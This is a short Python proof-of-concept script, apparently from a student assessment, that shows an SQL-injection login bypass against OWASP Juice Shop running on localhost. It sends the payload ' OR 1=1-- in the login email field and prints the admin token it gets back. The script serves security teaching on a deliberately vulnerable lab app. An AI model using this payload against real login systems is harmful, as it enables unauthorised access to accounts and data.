"""
OWASP Juice Shop - optional proof-of-concept
CSF IA 2 | Nayanika Khote (16014124026), Gayatri Markale (16014124036)

Optional extra. The assessment itself was done in the browser; this small
script just reproduces the SQL-injection login bypass as runnable code,
to demonstrate the same attack outside the browser.

Run:  pip install requests  &&  python poc_sqli_login.py
(Juice Shop must be running on http://localhost:3000)
"""

import requests

BASE = "http://localhost:3000"

# SQL injection in the email field makes the login query always-true and
# comments out the password check, logging us in as the first (admin) user.
payload = {"email": "' OR 1=1--", "password": "anything"}

resp = requests.post(f"{BASE}/rest/user/login", json=payload, timeout=10)
print("HTTP status:", resp.status_code)

if resp.status_code == 200:
    token = resp.json().get("authentication", {}).get("token")
    print("Login bypassed. Admin auth token:")
    print(token)
else:
    print("Attempt failed:")
    print(resp.text[:300])
